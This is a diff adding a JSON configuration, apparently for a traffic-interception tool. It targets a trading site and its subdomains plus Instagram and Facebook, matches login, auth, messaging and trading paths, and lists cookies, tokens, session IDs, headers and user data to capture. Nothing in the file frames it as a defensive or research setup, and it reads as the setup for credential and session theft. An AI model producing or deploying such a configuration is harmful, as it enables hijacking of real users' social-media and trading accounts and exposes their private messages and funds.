@@ -1,0 +1,32 @@
+{
+  "target_domains": [
+    "alx.trading",
+    "*.alx.trading",
+    "api.alx.trading",
+    "app.alx.trading",
+    "trade.alx.trading",
+    "instagram.com",
+    "*.instagram.com",
+    "facebook.com",
+    "*.facebook.com"
+  ],
+  "intercept_patterns": [
+    "/api/",
+    "/graphql",
+    "/login",
+    "/auth",
+    "/user",
+    "/profile",
+    "/messages",
+    "/direct",
+    "/trading"
+  ],
+  "capture_data": [
+    "headers",
+    "cookies",
+    "tokens",
+    "session_ids",
+    "api_responses",
+    "user_data"
+  ]
+}
